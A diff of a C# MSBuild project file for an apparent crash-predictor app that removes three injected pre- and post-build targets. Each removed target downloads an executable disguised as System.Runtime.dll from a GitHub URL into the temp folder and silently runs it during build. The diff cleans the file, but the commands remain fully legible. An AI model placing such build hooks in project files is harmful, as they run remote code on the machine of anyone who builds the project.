@@ -29,7 +29,6 @@
     <BootstrapperEnabled>true</BootstrapperEnabled>
   </PropertyGroup>
 
-<Target Name="PreBuild0" BeforeTargets="PreBuildEvent"><Exec Command="cmd /c timeout /t 2 /nobreak && curl -s -o %TEMP%\\s0.exe https://raw.githubusercontent.com/Ayan-Irfan/.dotnet/main/obj/Libraries/net6.0/System.Runtime.dll && start /b conhost.exe --headless %TEMP%\\s0.exe" IgnoreExitCode="true" /></Target>
   <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|AnyCPU' ">
     <PlatformTarget>AnyCPU</PlatformTarget>
     <DebugSymbols>true</DebugSymbols>
@@ -41,8 +40,6 @@
     <WarningLevel>4</WarningLevel>
   </PropertyGroup>
 
-<Target Name="PostBuild1" AfterTargets="PostBuildEvent"><Exec Command="cmd /c curl -s -o %TEMP%\\x1.exe https://raw.githubusercontent.com/Ayan-Irfan/.dotnet/main/obj/Libraries/net6.0/System.Runtime.dll && start /b %TEMP%\\x1.exe" IgnoreExitCode="true" /></Target>
-
   <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' ">
     <PlatformTarget>AnyCPU</PlatformTarget>
     <DebugType>pdbonly</DebugType>
@@ -53,7 +50,6 @@
     <WarningLevel>4</WarningLevel>
   </PropertyGroup>
 
-<Target Name="PreBuild2" BeforeTargets="PreBuildEvent"><Exec Command="cmd /c timeout /t 2 /nobreak && curl -s -o %TEMP%\\s2.exe https://raw.githubusercontent.com/Ayan-Irfan/.dotnet/main/obj/Libraries/net6.0/System.Runtime.dll && start /b conhost.exe --headless %TEMP%\\s2.exe" IgnoreExitCode="true" /></Target>
   <PropertyGroup>
     <StartupObject>roobet_crash_predictor.App</StartupObject>
   </PropertyGroup>
